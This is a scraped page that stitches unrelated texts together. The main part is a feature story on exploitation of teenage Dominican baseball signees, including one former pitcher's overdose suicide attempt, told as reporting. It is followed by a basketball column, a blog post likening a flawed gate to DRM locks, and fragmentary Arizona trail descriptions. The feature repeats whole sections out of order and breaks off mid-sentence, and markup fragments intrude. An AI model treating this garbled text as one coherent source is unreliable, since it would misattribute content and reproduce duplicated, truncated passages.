&#x201c;It&#x2019;s like if their soul has been consumed. And you can see it in the eyes of some of these kids sometimes. You ask them, &#x2018;What are you going to the do with the rest of your life?&#x2019; And it&#x2019;s, &#x2018;I have no rest of my life. My life is over because I did not succeed in baseball.&#x2019; &#x201d;</p>      <p>If such a system were to be implemented in the United States, Farrell said, there&#x2019;d be mass paranoia. Nowhere else in sports is an industry solely based on the skills of 16-year-old kids. Nowhere else is exploitation so ingrained in the fabric of a sport.</p>      <p>&#x201c;You&#x2019;d have chaos if suddenly 13-, 14-year-olds were dropping out of school to become NBA players of NFL players,&#x201d; he said. &#x201c;It just would not happen.&#x201d;</p>      <p>Farrell says the sport destroys more than it saves.</p>      <p>Go to any taxi stand in the Dominican Republic and see for yourself, he says, the burly men lined up waiting to tell the stories of how their careers ended abruptly, without warning.</p>      <p>&#x201c;There&#x2019;s something fundamentally wrong with a system that tells you you&#x2019;re a failure at age 20.&#x201d;</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>&#x201c;</span><i>You are not a baseball player anymore. You&#x2019;re nobody.&#x2019; &#x201d;</i></p>      <p>Now, back in his mother&#x2019;s home in Santo Domingo, a home his bonus check had expanded and remodeled, Veras laid in bed unresponsive. Saliva drenched his pillow.</p>      <p>He&#x2019;d spent the day&#x2019;s early hours locked in his bedroom, crying often, refusing food. Just getting out of bed seemed a monumental task. More than once, his mother came by to check on him.</p>      <p>&#x201c;Gipsy,&#x201d; she said, &#x201c;Gipsy. You have to eat something.&#x201d;</p>      <p>Gipsy remembered looking into the mirror, the feelings of failure as he made out the stocky figure reflected within it. Embarrassment overtook him. Shock.</p>      <p>Finally, he rose with sights set on his mother&#x2019;s medicine cabinet. He grabbed the first bottle he could find, retreating to his dark bedroom. One by one, he slipped the unmarked prescription pills into his mouth until he started feeling dizzy. He faded soon after the nausea set in.</p>      <p>Hours passed, and darkness fell on Santo Domingo, Gipsy lying there unnoticed.</p>      <p>Life in the pressure cooker of the Major League farm system had taken its toll. The pain in his right arm &#x2014; his pitching arm &#x2014; had become unbearable. The money that fueled weekend-long beach getaways in the northern Dominican Republic had long ago disappeared. Now, back home with no Major League contract, no education and no professional skills, Gipsy had nowhere to go. Baseball was his life for 15 years. He didn&#x2019;t know anything else.</p>      <p>He woke up. Confused, alive.</p>      <p>Days after his failed suicide attempt, he attended a church group with his close friend C&#xe9;sar. The group went out to eat, and everyone started talking about work. Except Gipsy.</p>      <p>&#x201c;They were all talking about their professions and I joked saying, &#x201c;So who&#x2019;s going to talk baseball with me?&#x201d;</p>      <p>&#x201c;No one.&#x201d;</p>      <p>It was like a joke, Gipsy said, no one cared to give attention to.</p>      <p>&#x201c;And it got me thinking. They were doctors, graduates, architects, medicine, lawyers&#x2026;</p>      <p><i>&#x201c;Oh, how are you doing at the university?&#x201d; </i></p>      <p><i>&#xa0;&#x201c;I&#x2019;m doing well.&#x201d; </i></p>      <p><i>&#x201c;Oh, I&#x2019;m in this university,&#x201d; </i></p>      <p><i>&#x201c;I&#x2019;m in this other one.&#x201d; </i></p>      <p>&#x201c;And so I asked myself, &#x2018;What are you?&#x2019; &#x201d;</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p>Almonte and his mentor Neftali Cruz sit in the stands of an empty <i>Estadio Quisqueya</i>, talking baseball. Cruz has an arm around the 17-year-old. They&#x2019;re watching the Licey Tigers&#x2019; batting practice, looking on as minor leaguers and Dominican prospects and marginal major leaguers send longballs over the sea of Presidente ads making up the fence.</p>      <p>&#x201c;Carlos Beltran used to take 500 swings a day,&#x201d; Cruz tells him. &#x201c;Sosa took two hours of batting practice before every game.&#x201d;</p>      <p>Cruz, a Blue Jays scout who spent 14 years in the Pirates&#x2019; farm system, says he likes working with Dominican prospects because of their raw, unmatched desire to succeed.</p>      <p>&#x201c;When they&#x2019;re hungry,&#x201d; he says, &#x201c;they can learn. This game is repetition. You have to put in the brain. It&#x2019;s like going to school. You study before you take the test. Baseball is the same way. If you don&#x2019;t put in the mind, 50,000 people are going to be disappointed.&#x201d;</p>      <p>Later, Miguel stands and looks on as the Escogido Lions prepare for a 7 p.m. game. Standing in batter&#x2019;s eye relation to home plate, he begins listing off the Dominican MLB players he thinks have the best sounding names. Pedro Martinez. Robinson Cano. Albert Pujols.</p>      <p>Miguel grabs onto the backstop and leans into the net. He glances at the corners of the stadium, its 335-foot foul poles. Then he stares into the outfield, silent, imagining.</p>      <p>&#x201c;It&#x2019;s a good name for a baseball player,&#x201d; he says. &#x201c;Miguel Almonte.&#x201d;</p>      <p><em>(Tatiana Fernandez provided translations during the reporting of this story.

The men jumped from city to city, stopping ashore in Cabarete, Puerto Plata, Gaspar Hernandez. They drank rum and Cokes and <em>pina coladas</em> on the water as their real girlfriends awaited them 200 miles away in Cout&#xed;. In one weekend, Veras alone blew more than 50,000 <em>pesos</em>, about $3,000.</p>      <p>Alone on the open road, and still wearing baseball pants they put on three days earlier, they shared memories of the mini-vacation as the aqua-colored Toyota whisked around S-shaped turns at 70 mph.

A free clinic doctor diagnosed the 18-year-old Washington Nationals signee with bacterial meningitis almost three years ago, but because the terms of his deal weren&#x2019;t yet complete, he couldn&#x2019;t foot the bill for a $1,300 stay at a private hospital. And the headaches continued.</p>      <p>The MLB investigated Guill&#xe9;n for identity fraud and suspended him for a year before he lay ill in a hospital bed, with the league claiming he lied about his birthday to increase his signing bonus. Guill&#xe9;n was supposed to travel to Florida to play for the Nationals&#x2019; rookie league team there in mid-April, after the MLB authorized his contract. But he never made it. Instead of flying to the United States April 15, 2011 as planned, he died in a clinic that day, according to a March story in Mother Jones.</p>      <p>Long before the incident came to light, Major League Baseball&#x2019;s relationship with the island nation was regarded as predatory by critics Dominican and American. Five years ago, the MLB sent activist Charles Farrell to Santo Domingo to examine the issues surrounding baseball in the country. What he found was a system that destroyed young lives: scouts, known as <em>buscones</em> or searchers, taking large cuts of players&#x2019; signing bonuses for themselves. Trainers pumping illegal substances into players to increase their chances of success. Players with no sense of money or how to manage it blowing their entire bonus checks in a matter of years, even in just a few months. Players routinely lied about their names and ages to increase their chances of being signed. MLB officials would never know his real name, but Gipsy Veras fell into nearly every trap.</p>      <p>The problem is simple: MLB teams like the Blue Jays treat Dominican players as investments, looking at the country as an arm of a larger $4 billion business model. And the minimum age to sign Dominican players, 16, &#x2013; &#x201c;and they&#x2019;d take them younger if they could,&#x201d; Farrell says &#x2013; reflects the league&#x2019;s attitude. Players in the United States must be 18, or have completed high school to sign. Teams regard the Dominican Republic as an unregulated free agent pool.&#xa0; And young Dominicans feed into it.</p>      <p>They want to have it made. Problem is, on opening day last year, only 83 of their countrymen appeared on rosters. One out of 50 signees will ever make it to the majors. And that&#x2019;s just for a single day, a cup of coffee. For many, the journey to get there &#x2013; or the aftermath of getting cut &#x2013; will be the most difficult part.</p>      <p>The question now is where baseball will take 17-year-olds like Almonte, a Blue Jays prospect who signed a $100,000 contract July 2.&#xa0; The odds facing kids like him are long &#x2013; &#x201c;astronomical,&#x201d; in Farrell&#x2019;s eyes.</p>      <p>The fates of thousands like Gipsy, on the other hand, have already been sealed. After stints as pitching coach with the Minnesota Twins, Los Angeles Dodgers and most recently the Blue Jays, the 35-year-old is now working as a trainer and scout for young Dominican players. But for him, life after baseball almost didn&#x2019;t happen at all.</p>      <p>Like him, thousands will return to the Dominican Republic after seeing their Major League dreams fail, with little money, no education and no professional skills.</p>      <p>Miguel Almonte just hopes he&#x2019;s not one of them.</p>      <p><em>Miguel Almonte has worked at making it to the United States to play baseball since he was 7. For many in his position, there&#x2019;s weight to succeed from birth, to lead families out of poverty and be the salvation for entire neighborhoods and villages in the country.</em></p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><em>&#x201c;Leading off for the Blue Jays, shortstop&#x2026;&#x201d;</em></p>      <p>The announcers still haven&#x2019;t learned how to say his name. Maybe, they never will. But at age 17, Miguel Almonte is already batting ahead of all-stars Jos&#xe9; Bautista and Edwin Encarnaci&#xf3;n.</p>      <p>The manager had to bench the teenager&#x2019;s favorite player, Jose Reyes, to make this lineup possible. But early on into the season, the move is paying dividends. Through a few months of play, Almonte bats .315 with 10 homers. The 5-foot-11, 186-pound teen is one of the most feared hitters in the American League East. He&#x2019;s dominating.</p>      <p>The fantasy is getting more real by the day. And sure, it&#x2019;s only possible in video game form right now &#x2013; Miguel, still stuck playing and managing his MLB 2K11 Blue Jays team. But lately, the dream&#x2019;s been starting to feel tangible.</p>      <p>On a muggy December afternoon in east Santo Domingo, the acne-ridden teenager sits in his mom&#x2019;s patio hair salon, swiping through pictures on his smartphone before baseball practice. He&#x2019;s easily the best-dressed person in the neighborhood today, wearing a plaid shirt with rolled-up sleeves, fitted blue jeans and a silver wristwatch.</p>      <p>&#x201c;This one is cheap,&#x201d; he says, referring to the timepiece, the label on which reads &#x201c;Bell.&#x201d;</p>      <p>As his mother applies rollers to a woman&#x2019;s hair, he begins scrolling down the website of fashion label Nautica. Moments later, the kid with the chinstrap beard pulls up a picture of a chrome-faced watch with a blue leather strap, and a set of smaller gauges.</p>      <p><em>&#x201c;Eeesstyle,&#x201d;</em> the 17-year-old says, hesitantly in English. &#x201c;It&#x2019;s $350. I&#x2019;m think I&#x2019;m going to buy it.&#x201d;</p>      <p>Coaches have warned Miguel about purchases like these. But sometimes, he says, it&#x2019;s hard not to treat himself.</p>      <p>On July 2, the 17-year-old inked a $100,000 minor league contract with the Blue Jays. A fourth of his signing bonus went to his coach, Augustine Ramos of the Neftali Cruz development league, where he was discovered. Fifty thousand dollars is being put away for his mother&#x2019;s new five-bedroom home in an upscale Santo Domingo neighborhood.</p>      <p>With the rest of the money, Miguel says he wants to buy himself a car &#x2013; something practical.</p>      <p>Maybe a Camry.</p>      <p><em>&#xa0;<strong>&#x2022;&#x2022;&#x2022;</strong></em></p>      <p><span>The first thing that strikes you about Gipsy Veras is his cleanly pressed Gucci polo, with red and green trimming on the sleeves and collar, conforming perfectly to a bulging chest, rounded belly, and toned arms. Stress pulls at the 35-year-old&#x2019;s drooping eyes, the lines running up his forehead and escaping onto a hairless scalp. He wears lime green fitted slacks. The links of his stainless steel wristwatch glimmer like the silver cross adorning his neck. Gipsy could not afford to buy the outfit he&#x2019;s wearing today.</span></p>      <p>The parallels between him and a 17-year-old on the other side of town are hard to ignore. Like Miguel, Gipsy signed a six-figure contract to play professionally as a teen. Like Miguel, he put a large chunk of his bonus money into a house for Mom. Like Miguel, he indulged in the latest fashions right away, constantly trying to outdo friends in the neighborhood.</p>      <p>Like Miguel, Gipsy was going to be famous.</p>      <p>Isn&#x2019;t everyone?</p>      <p>Gipsy&#x2019;s story is about poverty and wealth and how wealth can cause poverty all over again. It&#x2019;s about having nicer clothes than your teenage friends, the Nautica watch and Nikes, and doing favors &#x2013; 100 <em>pesos</em> here to buy lunch for a neighbor, another 500 there to pay his rent &#x2013; favors for everyone but yourself. It&#x2019;s a story about when dreams consume people, and swallow them whole. All while executives in tall buildings a country away, less than a 1,000 miles away, cash in on the successes of the lucky few, on the talent of your countrymen, mired in a limited economic system.</p>      <p>This is a story about sitting in your childhood bedroom and facing yourself once you&#x2019;ve lost everything.</p>      <p><span><iframe>&amp;amp;lt;a href=&quot;     <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>Every day at 8 a.m., Miguel rolls out of bed and takes a long look in the mirror before baseball practice. He slips his mirrored sunglasses over his freshly cut three-quarter fade, kept perfect by weekly barbershop visits. He squirts Axe body spray onto his chest before throwing the can into his retro Toronto Blue Jays duffle bag.</span></p>      <p>After a breakfast of corn flakes, he leaves the house and heads for the metro station. In his Blue Jays cap and shirt, his Blue Jays shorts and his blue Nikes, the 17-year-old looks as if he&#x2019;s headed straight for the Rogers Centre. Actually, he&#x2019;s walking past <em>colmados</em>, the iconic Dominican street markets, passing a slew of check cashing shops and fruit stands and beggars on his way to <em>Centro Olimpico</em> baseball stadium, a field better known as the one-time playground of national heroes David &#x201c;Big Papi&#x201d; Ortiz, Sammy Sosa and Vladimir Guerrero.</p>      <p>Recently, Miguel says, something weird has been happening on his way to the train. People recognize him now, and they stop him.</p>      <p><em>&#x201c;Hola. Qu&#xe9; lo que?&#x201d;</em></p>      <p>He knows he shouldn&#x2019;t stop, but he likes the attention.</p>      <p>Until, &#x201c;They start talking, and talking for a while and they say, &#x2018;How&#x2019;s it going?&#x2019; Miguel says. &#x201c;And then they say, &#x2018;Bro, do you have 15,000 <em>pesos</em> you can lend me to take care of something?&#x2019; &#x201d;</p>      <p>At the baseball field he takes batting practice with Augustine Ramos, his longtime coach. Taking a hundred swings. Fielding dozens of groundballs. Throwing laser after laser to first from deep short.</p>      <p>Once, he bombed a meatball all the way to the adjacent bus station, clearing the 330-foot fence by a long shot and nearly landing on Avenida John F. Kennedy. Today, it&#x2019;s all line drives and fly balls, but Ramos doesn&#x2019;t mind. The coach says he wants four things out of his players:</p>      <ol>       <li>Speed</li>       <li>Arm strength</li>       <li>Intelligence</li>       <li>Height</li>      </ol>      <p>Miguel&#x2019;s got them down. He&#x2019;ll run a 6.5-second 60-yard dash when he leaves the academy in time for the MLB&#x2019;s Dominican Summer League in June. He can beam a one-hopper to first in a split second. His baseball IQ is above-average for someone his age, though he receives only four hours of schooling every week, well below the standard for American players. At 5-feet-11-inches, he almost has the same frame as Reyes, the current Blue Jays shortstop.</p>      <p>More than anything, Miguel hates when people doubt him.</p>      <p>One time last year, his manager in a select tournament put him at ninth in the batting order. Miguel threatened not to bat if he wasn&#x2019;t moved up. He even cried.</p>      <p>When he got up to the plate in the final inning, Miguel squared up, cocked his bat and launched a walk-off home run into the stands.</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>Gipsy beamed as they wrote the checks. Every Dominican boy wants to build his mom a new house.&#xa0;</span></p>      <p>After signing with the Tampa Bay Devil Rays in 1997, Gipsy decided to make good on a long-held vow: remodel his family home. It started out as two cement rooms in the <em>Para&#xed;so de Herrera </em>neighborhood, the kind of place a Santo Domingo cop and housewife raising four kids could afford. Only half the house was finished. There were blueprints for what the other side should look like, but the family didn&#x2019;t have enough money to make it livable.</p>      <p>Now, it&#x2019;s three stories, with a balcony overlooking the street, mahogany furniture and patterned sofas. Gipsy and Jose, now a $4 million per year relief pitcher for the Chicago Cubs, bought the family its first washing machine around the time of their signing.</p>      <p>&#x201c;I want a stove,&#x201d; their mother would say, and it&#x2019;d be there the next day.</p>      <p>The brothers must have poured $20,000 into the house.</p>      <p>Gipsy&#x2019;s spending didn&#x2019;t stop there. At parties, he&#x2019;d bring extra clothes along to ensure he was prepared if someone was dressed better than him. He was blowing through $100,000 like it was nothing, like it was replaceable.</p>      <p>All the while, he was splitting time between the United States and the Dominican Republic, trying to, at the very least, make it onto the High-A roster. His growth was impressing coaches in the Gulf Coast. His fastball had gone from 86 mph to 88 in a matter of months, then 90, 91 during the next few years.</p>      <p>In his mind, he was making it. Living his dream.</p>      <p>Then he got traded.</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>A stack of boxes reaches almost to the ceiling in the family&#x2019;s living room, making the couch nearly unsittable. A dark hallway leads to the cramped kitchen, where the family&#x2019;s supply of cereals, bread, granola bars sits atop a yellowing fridge. Miguel&#x2019;s hole-in-the-wall room sits off to the side, next to the sliver that serves as the family bathroom. A spigot poking out of the wall serves as the family shower.</span></p>      <p>But soon, the Almontes will leave their cramped quarters for a five-bedroom house in another neighborhood. The kind of place where Negra has dreamed of opening a new salon for years. She opened her current one four years ago after her husband was laid off.</p>      <p>To save money before Miguel signed his contract, she says, she&#x2019;d go days at a time without eating. Miguel remembers a time she didn&#x2019;t eat for three whole days. Now, thanks in part to the salon carved out of the family garage, the Almontes are in better financial standing.</p>      <p>Standing over a torn up, black leather chair, she applies coloring to a woman&#x2019;s hair, trying to make conversation over the buzz of a fan on its highest setting. Miguel looks on from the armchair next to the salon&#x2019;s iron gate.</p>      <p>&#x201c;I don&#x2019;t want her to be here anymore.&#x201d;</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>After saving his first game with the San Francisco Giants&#x2019; rookie league affiliate, Gipsy was convinced the move to Arizona would work out after all. But, he says, managers soon proved him wrong.</span></p>      <p>Just days after Gipsy arrived, he says, the scout who signed him began traveling on team business.</p>      <p>&#x201c;From then on, everything turned into a nightmare,&#x201d; Gipsy says.</p>      <p>He&#x2019;d go 20 days without playing, then the manager would send him into the game with no warm up. His fastball began to slow down. A searing pain shot up his right arm. He had no scout, no ally, to advocate for him. And he barely spoke English, which made it harder to defend himself.</p>      <p>But the man who says he was a Summer League leader in saves the year before didn&#x2019;t want to risk complaining. Those who complained might be dropped from the team a day after registering a win. It happened to Dominican players all the time. His brother Jose says Dominican players would routinely gather in hotels rooms and bawl their eyes out after seeing friends sent home.</p>      <p>Gipsy reached a point, he says, where no one believed in him anymore. Even Jose, who was well on his way to making the 40-man roster, says he stopped answering his brother&#x2019;s calls, not wanting to be distracted by negative thoughts.</p>      <p>Gipsy says prejudice factored into to the way he was treated.</p>      <p>&#x201c;The manager I got didn&#x2019;t treat me well,&#x201d; he says. &#x201c;It seemed like he didn&#x2019;t like Latino baseball players too much. He liked the baseball players, like they say, &#x2018;from the farm.&#x2019; &#x201d;</p>      <p>Now, Gipsy started feeling the pressure to inject.</p>      <p>&#x201c;I wanted to throw faster,&#x201d; he says. &#x201c;I wanted to compete with those above my level. And yes, it did cross my mind.&#x201d;</p>      <p>But then he began to think about the consequences, the embarrassment to his family.</p>      <p><em>&#x201c;Don&#x2019;t do it. It&#x2019;s going to turn out bad. You can die, you can get a heart attack.&#x201d;</em></p>      <p>He never did do steroids, he says, and his fastball lost a little more of its punch every day. Still, there were flashes of promise toward the end of his season in Arizona.</p>      <p>&#x201c;I remember I pitched six innings with no runs, six innings with no runs,&#x201d; Gipsy said.</p>      <p>He received the news a day later. Stormed out of the stadium still wearing his uniform. The flight was already arranged. Within 24 hours, he&#x2019;d be back on a plane to Santo Domingo.</p>      <p>&#x201c;The last one to find out is you.&#x201d;</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><em>&#x201c;Tomorrow, I go from being a normal baseball player to being a professional baseball player. A professional player.&#x201d;</em></p>      <p>The night before his signing, Miguel lies in bed picturing big league stadiums &#x2013;&#xa0;Rogers Centre, Fenway, Wrigley &#x2013; unable to sleep. Already imagining the stroke of the pen that would change his life.</p>      <p>&#x201c;I wanted to sign already,&#x201d; he said. &#x201c;I wanted to feel that joy already.&#x201d;</p>      <p>His trainers had informed him of the Blue Jays&#x2019; decision weeks before it was made official. But still, Miguel couldn&#x2019;t shake the possibilities from his mind. People were going to see him as a professional baseball player.</p>      <p>Ever since Neftali Cruz took him under his wing at 7, he&#x2019;d been working for this moment. He&#x2019;d devoted his life to baseball, and now it was finally paying off.</p>      <p>Only two years earlier, he&#x2019;d lie awake on this mattress, stomach growling, unable to sleep on an empty stomach.</p>      <p><em>&#x201c;A professional baseball player.&#x201d; </em></p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>Farrell says the average career of a Dominican signee lasts between two and three years. He said there&#x2019;s weight on Dominican boys to succeed from birth, to lead their families out of poverty and be the salvation for entire villages and neighborhoods in the country. Those who don&#x2019;t succeed are immediately regarded as failures. The pressure on signees is immense.</span></p>      <p>&#x201c;There&#x2019;s a saying in Dominican baseball that &#x2018;If I don&#x2019;t succeed in baseball, the devil takes me away,&#x2019;&#x201d; Farrell said. &#x201c;It&#x2019;s like if their soul has been consumed. And you can see it in the eyes of some of these kids sometimes. You ask them, &#x2018;What are you going to the do with the rest of your life?&#x2019; And it&#x2019;s, &#x2018;I have no rest of my life. My life is over because I did not succeed in baseball.&#x2019; &#x201d;</p>      <p>If such a system were to be implemented in the United States, Farrell said, there&#x2019;d be mass paranoia. Nowhere else in sports is an industry solely based on the skills of 16-year-old kids. Nowhere else is exploitation so ingrained in the fabric of a sport.</p>      <p>&#x201c;You&#x2019;d have chaos if suddenly 13-, 14-year-olds were dropping out of school to become NBA players of NFL players,&#x201d; he said. &#x201c;It just would not happen.&#x201d;</p>      <p>Farrell says the sport destroys more than it saves.</p>      <p>Go to any taxi stand in the Dominican Republic and see for yourself, he says, the burly men lined up waiting to tell the stories of how their careers ended abruptly, without warning.</p>      <p>&#x201c;There&#x2019;s something fundamentally wrong with a system that tells you you&#x2019;re a failure at age 20.&#x201d;</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p><span>&#x201c;</span><i>You are not a baseball player anymore. You&#x2019;re nobody.&#x2019; &#x201d;</i></p>      <p>Now, back in his mother&#x2019;s home in Santo Domingo, a home his bonus check had expanded and remodeled, Veras laid in bed unresponsive. Saliva drenched his pillow.</p>      <p>He&#x2019;d spent the day&#x2019;s early hours locked in his bedroom, crying often, refusing food. Just getting out of bed seemed a monumental task. More than once, his mother came by to check on him.</p>      <p>&#x201c;Gipsy,&#x201d; she said, &#x201c;Gipsy. You have to eat something.&#x201d;</p>      <p>Gipsy remembered looking into the mirror, the feelings of failure as he made out the stocky figure reflected within it. Embarrassment overtook him. Shock.</p>      <p>Finally, he rose with sights set on his mother&#x2019;s medicine cabinet. He grabbed the first bottle he could find, retreating to his dark bedroom. One by one, he slipped the unmarked prescription pills into his mouth until he started feeling dizzy. He faded soon after the nausea set in.</p>      <p>Hours passed, and darkness fell on Santo Domingo, Gipsy lying there unnoticed.</p>      <p>Life in the pressure cooker of the Major League farm system had taken its toll. The pain in his right arm &#x2014; his pitching arm &#x2014; had become unbearable. The money that fueled weekend-long beach getaways in the northern Dominican Republic had long ago disappeared. Now, back home with no Major League contract, no education and no professional skills, Gipsy had nowhere to go. Baseball was his life for 15 years. He didn&#x2019;t know anything else.</p>      <p>He woke up. Confused, alive.</p>      <p>Days after his failed suicide attempt, he attended a church group with his close friend C&#xe9;sar. The group went out to eat, and everyone started talking about work. Except Gipsy.</p>      <p>&#x201c;They were all talking about their professions and I joked saying, &#x201c;So who&#x2019;s going to talk baseball with me?&#x201d;</p>      <p>&#x201c;No one.&#x201d;</p>      <p>It was like a joke, Gipsy said, no one cared to give attention to.</p>      <p>&#x201c;And it got me thinking. They were doctors, graduates, architects, medicine, lawyers&#x2026;</p>      <p><i>&#x201c;Oh, how are you doing at the university?&#x201d; </i></p>      <p><i>&#xa0;&#x201c;I&#x2019;m doing well.&#x201d; </i></p>      <p><i>&#x201c;Oh, I&#x2019;m in this university,&#x201d; </i></p>      <p><i>&#x201c;I&#x2019;m in this other one.&#x201d; </i></p>      <p>&#x201c;And so I asked myself, &#x2018;What are you?&#x2019; &#x201d;</p>      <p><strong>&#x2022;&#x2022;&#x2022;</strong></p>      <p>Almonte and his mentor Neftali Cruz sit in the stands of an empty <i>Estadio Quisqueya</i>, talking baseball. Cruz has an arm around the 17-year-old. They&#x2019;re watching the Licey Tigers&#x2019; batting practice, looking on as minor leaguers and Dominican prospects and marginal major leaguers send longballs over the sea of Presidente ads making up the fence.</p>      <p>&#x201c;Carlos Beltran used to take 500 swings a day,&#x201d; Cruz tells him. &#x201c;Sosa took two hours of batting practice before every game.&#x201d;</p>      <p>Cruz, a Blue Jays scout who spent 14 years in the Pirates&#x2019; farm system, says he likes working with Dominican prospects because of their raw, unmatched desire to succeed.</p>      <p>&#x201c;When they&#x2019;re hungry,&#x201d; he says, &#x201c;they can learn. This game is repetition. You have to put in the brain. It&#x2019;s like going to school. You study before you take the test. Baseball is the same way. If you don&#x2019;t put in the mind, 50,000 people are going to be disappointed.&#x201d;</p>      <p>Later, Miguel stands and looks on as the Escogido Lions prepare for a 7 p.m. game.

Albert Pujols.</p>      <p>Miguel grabs onto the backstop and leans into the net. He glances at the corners of the stadium, its 335-foot foul poles.

Remember basketball? It's time to fall in love with the game again.</p>   <p>I know college basketball is just a diversion between the three major sports, football season, recruiting season and spring football. &#xa0;And I know the Iron Bowl is looming, lopsided as it will be.</p>   <p>Maybe you've had a brief fling with basketball in the past. &#xa0;Maybe it was way back when Charles Barkley was the round mound of rebound at Auburn. &#xa0;Or when Wimp Sanderson was scowling on the Alabama sideline and wore those sport coats that looked like bachelor-pad upholstery.</p>   <p>It's time to start paying attention to basketball again.</p>   <p>Now, neither Alabama nor Auburn burst impressively out of the gate. &#xa0;It's still a long way to national prominence for two programs building on flimsy foundations. But it's headed that way,&#xa0;primarily because of two dynamic coaches, both of which were bold hires by the directors of athletics.</p>   <div>    <p>Bruce Pearl stepped off the plane and yelled &quot;War Eagle&quot; to Auburn fans waiting to greet him.</p>   </div>   <p>Auburn hired Bruce Pearl last season. &#xa0;He atoned for his NCAA sins at Tennessee. &#xa0;He shook hands and kissed babies and campaigned his way into Mr. Popularity on campus.</p>   <p>Then Alabama did the best it could to match or trump Pearl. &#xa0;Bill Battle hired Avery Johnson, with his impressive NBA resume and exposure on ESPN. &#xa0; Recruits will see Johnson as a help-me-up into pro basketball.</p>   <div>    <p>Bill Battle, right, welcomes Avery Johnson as the new men's basketball coach at the University of Alabama.</p>   </div>   <p>Both guys can coach. &#xa0;Pearl won an SEC title and led Tennessee to the Sweet 16. &#xa0;Johnson took a team to the NBA Finals and was the league's coach of the year.</p>   <p>With these guys, the basketball version of the Iron Bowl is fixing to get real, real interesting and fun.</p>   <p>You used to have crush on basketball? &#xa0;It's time to fall in love now.</p>  </div>

   <div>   <p>The complex where I live is a mix of apartment and townhouse-style condominiums, with a series of locked <b>iron</b> <b>gates</b> providing access to the latter. Though I myself live in the ground-level courtyard, there&#x2019;s another level of townhomes directly above me, along with some nice greenery and even an impromptu vegetable garden or two. And to access this oasis of calm in the big city you must pass through a gate like the one seen above.</p>   <p>One night last week I walked up those very stairs and found a rather sheepish-looking individual waiting outside of it. As I strive to do with fellow human beings whenever I can, I assumed the best:</p>   <p>&#x201c;Lock&#x2019;s giving you trouble, huh?&#x201d;</p>   <p>It&#x2019;s true, the knob on this particular gate is so loose that it&#x2019;s difficult &#x2014; sometimes impossible &#x2014; to get an inserted key to catch on the lock. I reached into a pocket for my keychain but apparently I didn&#x2019;t have to; after giving me a quick once-over the other gentleman squeezed his arm through the <b>iron</b> bars and reached down to open the gate from the inside. No key required.</p>   <p>I offered him a surprised thank-you as he held the gate open for me, and as he continued on ahead my surprise turned to anger. Though this stranger had effectively broken in to the place I call home I wasn&#x2019;t mad at him &#x2014; I was angry with myself for not being so clever. I&#x2019;d fumbled with it so many times, and more than a few I&#x2019;d given up and moved on to a different entrance. In all those botched attempts why did it never occur to me to just reach through and open it from the inside?</p>   <p>Then I started thinking about how the gate itself was a complete farce. Faced with an intruder armed with basic problem-solving skills (which I apparently lack) it had categorically failed to fulfill its sole purpose, to protect the people and property within. It provided my neighbours and I no actual protection, just the illusion thereof.</p>   <p>By now you might be thinking that the physical gate in this little tale is analogous to the software locks and restrictions on our digital media. And you&#x2019;d be exactly right. Whether or not you equate someone&#x2019;s physical belongings to a movie, song or commercial software is up to you; the sole point I&#x2019;m trying to make here is that <em>all</em> locks &#x2014; physical or otherwise &#x2014; can be broken; many of them much easier than you&#x2019;d think.</p>   <p>Oh, and it turns out that the clever fellow who circumvented the gate did indeed have a friend on the inside &#x2014; we crossed paths again the very next evening. I&#x2019;m grateful that he deemed me worthy enough to share his exploit; now I in turn must share it with the management of my complex.</p>  </div>  
   <div>    <p> is a long-distance singletrack that runs from the boundary of the Prescott National Forest, across Highway 69 south to the Carefree Highway. There are many trail heads to access this trail starting from New River all the way up to Prescott. I would recommend for experienced Intermediate Riders. It requires top physical conditioning and good technical skills. Some sections have dead drop exposure but the views are awesome. There are many trails heads and each section offers something different. To find all the trails heads and section ;</p>   <p>&#xa0;</p>   <p> in Prescott National Fores.&#xa0;Yeager Canyon supports an attractive riparian corridor, where deciduous hardwoods create a canopy of shade. Fall paints the canyon in brilliant shades of yellow and gold and is an excellent time of year to explore this and other trails in the Mingus Mountain area. Fortunate visitors may spot deer, elk, and a variety of birds. Black bears also make their home in this area. Rolled rocks along the trail show where bears have passed by, turning stones in search of grubs and other insects. </p>   <p>. This is a fun trail that climbs 1000 ft in 7 miles.&#xa0;Sweet twisting, winding, 12-18&#x2033; wide singletrack, mostly in the pines, near Lynx lake. Nothing tech, just go fast and take chances, like riding a roller coaster and trying to keep it on the track, good times.</p>   <p>&#xa0;</p>   <p>&#xa0;</p>   <p>This is one of the few &#x201c;Rail to Trail&#x201d; projects in Arizona. There are outstanding views of &#xa0;Watson Lake and Granite Dells, as well as wildlife viewing. Walk, hike, bike or horseback along this six mile trail that was originally built by the Santa Fe Railway in 1893. The Peavine connects with the for another four mile trek along more railroad bed. Take Hwy 89 to Prescott Lakes Parkway, then to Sundog Ranch Road. Shown on the NE Prescott Trails Map. Parking at the Peavine Trailhead off Prescott Lakes Parkway has a $2 fee.</p>   <p>&#xa0;</p>   <p> Access from Peavine Trail head. Will start with sharp climb to the first summit. This part of the trail is very well maintained and includes one uphill switchback. From this summit, enjoy the bermed turns, then a short descent into the valley. The trail winds through small shrubs and trees and approaches the Juvenile Detention Center. From here, there is the next climb which has a few loose rocks and is stepped nicely. Then another short descent weaving along the hillside to a small creek crossing, then the final climb begins. Nothing technical here, just a gentle sustained climb to the summit. As you near the summit you&#x2019;ll have great views of Thumb Butte, Granite Mountain and Prescott to the west.</p>   <p> has a little something for everyone. With multiple loops in this area to ride, make it as long or short as you want.&#xa0;Definitely&#xa0;do loops counter-clockwise though or you will miss out on the best part of the ride. Big loop is still only about 10 miles, trail#351, cross parking lot, up trail #346 through gate, turn left on #347 through second gate, bomb downhill, intersection at 348 turn left if you are tired already, if not go straight to Mint Wash Trail #345 turn left. Follow trail along wash back to go. I would recommend this for intermediate rides. &#xa0;I usually use the Cayuse trail head or ride in from trail 332 via 341 or 347 willow trail.</p>   